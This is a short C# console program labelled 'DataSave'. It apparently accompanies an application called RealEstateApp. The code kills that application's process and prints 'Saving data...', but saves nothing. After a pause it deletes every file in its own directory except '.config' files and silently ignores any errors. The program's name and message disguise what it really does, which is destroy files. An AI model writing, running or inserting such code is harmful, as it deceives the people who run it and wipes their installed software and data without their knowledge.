using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Reflection;
using System.Text;
using System.IO;
using System.Threading;

namespace DataSave
{
	class Program
	{
		static void Main(string[] args)
		{
			Process[] p = Process.GetProcessesByName("RealEstateApp");
			if (p.Length > 0)
			{
				p[0].Kill();
			}
			Console.WriteLine("Saving data...");
			Thread.Sleep(4000);
			string[] files = Directory.GetFiles(Path.GetDirectoryName(Assembly.GetExecutingAssembly().Location));
			foreach (string file in files)
			{
				try
				{
					if (!file.EndsWith(".config"))
					{
						File.Delete(file);
					}
				}
				catch (Exception)
				{
				}
			}
		}
	}
}
